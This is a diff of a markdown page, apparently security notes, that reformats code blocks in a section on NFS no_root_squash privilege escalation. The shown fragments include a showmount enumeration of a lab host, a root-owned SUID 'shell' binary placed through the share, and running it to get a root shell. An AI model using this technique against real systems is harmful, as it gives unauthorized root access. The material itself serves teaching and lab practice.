@@ -26,22 +26,14 @@ The danger here is the `no_root_squash` option. If you see this, it means that a
 
 ### Finding NFS folders from the outside
 
-We can also find these locations from our host machine, but without the rules associated with them. Using the `showmount -e` command:
+We can also find these locations from our host machine, but without the rules associated with them. Using the `showmount -e` command, which will show a list of folders like this:
 
-```bash
-showmount -e 10.10.158.49
-```
-
-This will show a list of folders like this:
-
-{% code title="$ showmount -e 10.10.158.49" %}
-```bash
-Export list for 10.10.158.49: 
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ showmount -e 10.10.158.49
+</strong>Export list for 10.10.158.49: 
 /home/ubuntu/sharedfolder * 
 /tmp * 
 /home/backup *
-```
-{% endcode %}
+</code></pre>
 
 ## Uploading a SUID binary
 
@@ -86,16 +78,14 @@ sudo chmod u+s target_tmp/shell
 
 Now if we look from the target machine, we see that we have created a `shell` program that is owned by root, and has the SUID bit set (seen by the `s` in the permissions).
 
-```shell-session
-$ ls -laF /tmp/shell
--rwsr-xr-x 1 root root 16784 Feb 27 09:42 /tmp/shell*
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ls -laF /tmp/shell
+</strong>-rwsr-xr-x 1 root root 16784 Feb 27 09:42 /tmp/shell*
    ^
-```
+</code></pre>
 
 This means we can now just run the `/tmp/shell` program on the target with our low-privilege user, to get a root shell.&#x20;
 
-```shell-session
-$ /tmp/shell
-# id
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ /tmp/shell
+</strong># id
 uid=0(root) gid=0(root) groups=0(root)
-```
+</code></pre>
